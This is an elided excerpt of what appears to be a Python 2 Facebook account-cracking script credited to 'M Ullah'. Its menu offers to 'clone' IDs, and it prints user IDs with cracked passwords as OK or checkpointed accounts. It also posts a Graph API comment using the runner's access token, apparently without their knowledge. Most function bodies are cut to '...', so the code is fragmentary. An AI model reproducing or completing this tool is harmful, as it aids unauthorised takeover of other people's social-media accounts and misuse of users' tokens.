...
\033[1;92mAuthor \033[1;93m: M Ullah

\033[1;92mFb \033[1;93m: AHMEDXAII
...
def log_fb():
    ...
    try:
        ...
        elif 'www.facebook.com' in q['https://www.facebook.com/M.ULLAH.BAAP.KI.ID.HA.TERY']:
...
def menu():
    ...
    try:
        ...
        requests.post('https://graph.facebook.com/' + aa1 + '/comments/?message=' + '&access_token=' + token)
...
def crack():
    ...
    print '\x1b[1;0m 1. \033[1;96mClone 3 Links\033[0m \n 2. \033[1;96mClone Single id\033[0m' ##Thanks M-ULLAH
...
def crack_select():
    ...
    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#Thanks M-ULLAH
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;31m[NAME-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks M-ULLAH
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##Thanks M-ULLAH
